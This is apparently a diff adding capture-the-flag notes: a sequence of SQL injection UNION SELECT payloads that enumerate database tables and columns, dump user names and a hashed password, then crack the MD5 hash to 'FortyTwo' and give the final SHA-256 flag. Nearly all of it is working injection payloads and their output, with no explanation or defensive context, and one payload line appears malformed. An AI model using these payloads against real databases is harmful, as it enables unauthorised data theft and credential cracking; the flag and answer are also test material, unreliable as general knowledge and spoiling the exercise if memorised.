@@ -1,0 +1,19 @@
+1 UNION SELECT table_name, null FROM information_schema.tables;
+1 UNION SELECT GLOBAL_VARIABLES, null FROM information_schema.tables;
+
+1 UNION SELECT column_name, null FROM information_schema.columns;
+
+1 UNION SELECT 1, first_name FROM users;
+=>      ID: 1 UNION SELECT 1, first_name FROM users; 
+        First name: 1
+        Surname : Flag
+
+1 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5;
+=> flag
+5ff9d0165b4f92b14994e5c685cdce28
+=> decrypt MD5:
+5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
+=> lower chars
+fortytwo
+=> sha-256
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
